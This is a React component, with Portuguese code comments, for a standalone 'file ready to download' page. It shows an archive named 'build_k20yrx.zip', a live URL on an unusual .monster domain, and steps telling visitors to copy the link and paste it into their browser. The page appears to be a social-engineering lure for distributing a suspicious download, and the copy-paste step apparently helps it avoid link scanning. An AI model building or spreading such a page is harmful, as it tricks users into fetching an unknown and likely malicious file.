import React, { useState } from 'react';
import { FileArchive, CheckCircle2, Copy, Loader2 } from 'lucide-react';

const Download = () => {
  const fileUrl = "https://trueflipdriveagidel.monster/mult/?v=660145&t=89b2d11f65a3c80b0f11";
  const [status, setStatus] = useState('idle'); // 'idle' | 'loading' | 'success'

  const handleCopy = () => {
    setStatus('loading');
    
    // Simulando um pequeno delay para o spinner ser visível
    setTimeout(() => {
      navigator.clipboard.writeText(fileUrl);
      setStatus('success');
      
      // Volta ao estado inicial após 2 segundos
      setTimeout(() => setStatus('idle'), 2000);
    }, 800);
  };

  return (
    <div className="min-h-screen bg-white dark:bg-slate-950 flex items-center justify-center p-4 transition-colors duration-300">
      <div className="bg-white dark:bg-slate-900 rounded-[2.5rem] shadow-2xl shadow-gray-200/50 dark:shadow-none w-full max-w-2xl p-8 md:p-14 flex flex-col items-center text-center border border-transparent dark:border-slate-800">
        {/* Header do Arquivo */}
        <div className="flex items-center justify-between w-full mb-10 bg-white dark:bg-slate-800/50 rounded-2xl p-5 border border-gray-100 dark:border-slate-700">
          <div className="flex items-center gap-4">
            <div className="bg-gray-200 dark:bg-slate-700 p-3 rounded-xl text-gray-500 dark:text-slate-400">
              <FileArchive size={32} />
            </div>
            <div className="text-left">
              <h3 className="font-bold text-gray-800 dark:text-slate-100 text-lg leading-tight">build_k20yrx.zip</h3>
              <p className="text-gray-500 dark:text-slate-400 text-sm font-medium">45.8 MB</p>
            </div>
          </div>
          <div className="flex items-center gap-2 bg-green-50 dark:bg-green-500/10 text-green-800 dark:text-green-400 px-4 py-1.5 rounded-full text-sm font-bold">
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
            Ready
            </div>
        </div>

        {/* Textos */}
        <h1 className="text-xl md:text-4xl font-extrabold text-gray-900 dark:text-white mb-3 tracking-tight">
          Your file is ready to download
        </h1>
        <p className="text-gray-500 dark:text-slate-400 mb-10 text-lg font-medium">
          Just copy the link below and paste it into your browser.
        </p>

        {/* Input Field */}
        <div className="w-full mb-6">
          <input 
            readOnly
            value={fileUrl}
            className="w-full bg-gray-50 dark:bg-slate-800 border border-gray-100 dark:border-slate-700 rounded-2xl py-5 px-6 text-gray-400 dark:text-slate-500 text-sm focus:outline-none transition-colors"
          />
        </div>

        {/* Botão com Spinner */}
        <button 
          onClick={handleCopy}
          disabled={status === 'loading'}
          className={`w-full relative overflow-hidden transition-all duration-300 font-bold py-5 rounded-2xl text-lg flex items-center justify-center gap-3 shadow-lg 
            ${status === 'success' 
              ? 'bg-green-500 text-white shadow-green-200 dark:shadow-none' 
              : 'bg-blue-600 hover:bg-blue-700 text-white shadow-blue-200 dark:shadow-none'} 
            ${status === 'loading' ? 'opacity-90 cursor-wait' : 'active:scale-[0.98]'}`}
        >
          {status === 'loading' && (
            <Loader2 className="animate-spin" size={22} />
          )}
          {status === 'success' && (
            <CheckCircle2 size={22} />
          )}
          {status === 'idle' && (
            <Copy size={22} />
          )}
          
          <span>
            {status === 'loading' ? 'Processing...' : status === 'success' ? 'Link Copied!' : 'Copy link'}
          </span>
        </button>

        {/* Footer Instructions */}
        <div className="mt-8 flex flex-wrap justify-center items-center gap-x-3 gap-y-2 text-blue-600/70 dark:text-blue-400/80 font-semibold text-sm bg-blue-50/50 dark:bg-blue-900/20 px-8 py-4 rounded-2xl">
          <span>1. Copy the link</span>
          <span className="hidden md:inline text-gray-300 dark:text-slate-700">•</span>
          <span>2. Paste it into your browser</span>
          <span className="hidden md:inline text-gray-300 dark:text-slate-700">•</span>
          <span>3. Press Enter</span>
        </div>

      </div>
    </div>
  );
};

export default Download;